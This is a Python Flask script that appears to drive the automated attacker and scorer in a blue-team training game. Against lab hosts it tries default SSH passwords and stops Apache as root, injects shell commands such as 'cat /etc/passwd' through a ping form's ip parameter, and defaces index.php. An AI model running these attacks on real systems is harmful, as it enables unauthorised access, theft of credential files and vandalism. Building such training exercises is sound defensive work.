import time
import paramiko
import requests
from flask import Flask, jsonify
import threading

# Variables for hostname and port numbers
HOSTNAMES = [
    'player1', 
    'player2',
    'player3',
    'player4',
    'player5',
    'player6',
    'player7',
]  # Add more hostnames as needed
SSH_PORT = 22
HTTP_PORT = 80
SCORE_SERVER_URL = 'http://score-server:3000/score'  # URL to send score updates
CHECK_INTERVAL = 120  # 2 minutes in seconds
CHECK_DURATION = 1800  # 30 minutes in seconds

# Create Flask app
app = Flask(__name__)

# Function to send score update to score server
def send_score_update(player_id, score):
    data = {
        'player_id': player_id,
        'score': score
    }
    try:
        response = requests.post(SCORE_SERVER_URL, json=data)
        print(f"Score updated for player {player_id}. Response Code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send score update for player {player_id}: {e}")

# Function to check if the web app returns status 200
def check_status_code(player_id, hostname):
    try:
        url = f"http://{hostname}:{HTTP_PORT}/"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Web app on {hostname} returned status 200")
            send_score_update(player_id, 10)
        else:
            print(f"Web app on {hostname} did not return status 200")
    except Exception as e:
        print(f"Error checking status code on {hostname}: {e}")

# Function to check if the web app is usable (ping test)
def check_web_app_usage(player_id, hostname):
    try:
        url = f"http://{hostname}:{HTTP_PORT}/?ip=127.0.0.1"
        response = requests.get(url)
        
        if "127.0.0.1 ping statistics" in response.text:
            print(f"Web app on {hostname} is usable, ping successful")
            send_score_update(player_id, 10)
        else:
            print(f"Web app on {hostname} is not usable, ping failed")
    except Exception as e:
        print(f"Error checking web app usage on {hostname}: {e}")

# Function to periodically check the web app's status and usability
def periodic_check():
    start_time = time.time()
    while time.time() - start_time < CHECK_DURATION:
        print("Starting periodic check for web app status and usability...")
        for index, hostname in enumerate(HOSTNAMES):
            check_status_code(index + 1, hostname)
            check_web_app_usage(index + 1, hostname)
        time.sleep(CHECK_INTERVAL)
    print("Periodic checks ended after 30 minutes.")

# Function to attempt SSH login
def ssh_login(hostname, port, username, password, player_id):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=port, username=username, password=password)
        print(f"SSH login successful for {username} on {hostname}")
        
        # If the login is for root, try to stop apache
        if username == 'root':
            client.exec_command('apachectl stop')

        client.close()
    except Exception as e:
        print(f"SSH login failed for {username} on {hostname}: {e}")
        send_score_update(player_id, 50)

# Attempt SSH logins for a given step
def ssh_logins():
    print("Attempting SSH logins...")
    for index, hostname in enumerate(HOSTNAMES):
        ssh_login(hostname, SSH_PORT, 'root', 'root', index + 1)
        ssh_login(hostname, SSH_PORT, 'user3', 'user3', index + 1)
        ssh_login(hostname, SSH_PORT, 'user8', 'user8', index + 1)
        ssh_login(hostname, SSH_PORT, 'user10', 'user10', index + 1)

# Attempts command injection for a given step
def command_injection_requests():
    print("Attempting command injection requests...")
    
    for index, hostname in enumerate(HOSTNAMES):
        url = f"http://{hostname}:{HTTP_PORT}/"
        
        # Define the commands to be executed
        commands = {
            'pwd': '/var/www/html',
            'id': 'www-data',
            'whoami': 'www-data',
            'cat /etc/passwd': 'www-data'
        }
        
        for command, expected_output in commands.items():
            params = {'ip': f'; {command}'}
            try:
                response = requests.get(url, params=params)
                print(f"GET {command} to {hostname}, Response Code: {response.status_code}, Output: {response.text}")
                
                # Check if the response status is 200 and the expected output is in the response
                if response.status_code == 200 and expected_output in response.text:
                    print(f"Command {command} executed successfully on {hostname}")
                else:
                    print(f"Command {command} failed on {hostname}, '{expected_output}' not found")
                    send_score_update(index + 1, 10)

            except Exception as e:
                print(f"Error with GET {command} to {hostname}: {e}")

# Additional OS command injection: cat /var/www/html/memo.txt
def additional_command_injection():
    print("Attempting additional command injection: cat /var/www/html/memo.txt")
    for index, hostname in enumerate(HOSTNAMES):
        url = f"http://{hostname}:{HTTP_PORT}/"
        command = 'cat /var/www/html/memo.txt'
        
        params = {'ip': f'; {command}'}
        try:
            response = requests.get(url, params=params)
            print(f"POST {command} to {hostname}, Response Code: {response.status_code}, Output: {response.text}")
            
            # Check if "dev:devpass" is in the response
            if "dev:devpass" not in response.text:
                print(f"'dev:devpass' not found in {hostname}, adding 50 points")
                send_score_update(index + 1, 50)
        except Exception as e:
            print(f"Error with POST {command} to {hostname}: {e}")

# Attempts to modify ping-checker page for a given step
def modify_ping_checker():
    print("Attempting to modify ping-checker page...")
    for index, hostname in enumerate(HOSTNAMES):
        url = f"http://{hostname}:{HTTP_PORT}/"
        payload = ('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" '
                   'content="width=device-width, initial-scale=1.0"><title>Hacked by Unknown</title><style>'
                   'body {background-color: black;color: red;text-align: center;font-family: Arial, sans-serif;'
                   'margin: 0;padding: 0;}h1 {margin-top: 20%;font-size: 60px;}p {font-size: 24px;}</style>'
                   '</head><body><h1>Hacked by Unknown</h1><p>Your website is compromised.</p>'
                   '<p>Take action immediately!</p></body></html>')

        params = {'ip': f'; echo "{payload}" > /var/www/html/index.php'}
        
        try:
            response = requests.get(url, params=params)
            print(f"POST modify request to {hostname}, Response Code: {response.status_code}")
            # Check if the page was modified
            time.sleep(5)
            modified_page = requests.get(url)
            if response.status_code == 200 and "Hacked by Unknown" not in modified_page.text:
                print(f"Failed to modify page on {hostname}")
                send_score_update(index + 1, 50)
            else:
                print(f"Page modified successfully on {hostname}")
        except Exception as e:
            print(f"Error with POST modify request to {hostname}: {e}")

# The attack sequence for all steps
def attack_sequence():
    print("Starting attack sequence...")
    time.sleep(10*60)  # Wait for 10 minutes before starting the attack

    # Step 1: SSH logins
    print("Step 1: SSH logins")
    ssh_logins()
    time.sleep(5*60)  # Wait for 5 minutes before proceeding to the next step

    # Step 2: Command injection
    print("Step 2: Command injection")
    command_injection_requests()
    time.sleep(5*60) # Wait for 5 minutes before proceeding to the next step

    # Step 3: Additional OS command injection: cat /var/www/html/memo.txt
    print("Step 3: Additional OS command injection")
    additional_command_injection()
    time.sleep(5*60) # Wait for 5 minutes before proceeding to the next step

    # Step 4: Page modification
    print("Step 4: Page modification")
    modify_ping_checker()

# Flask route to start the game
@app.route('/game-start', methods=['POST'])
def game_start():
    # Start the attack sequence in a new thread
    attack_thread = threading.Thread(target=attack_sequence)
    attack_thread.start()

    # Start periodic check in a new thread
    periodic_check_thread = threading.Thread(target=periodic_check)
    periodic_check_thread.start()

    return jsonify({"status": "Game started"}), 200

# Flask route to check health
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "Healthy"}), 200

# Main function to run the Flask server
def main():
    app.run(host='0.0.0.0', port=5555)

# Execute
if __name__ == "__main__":
    main()
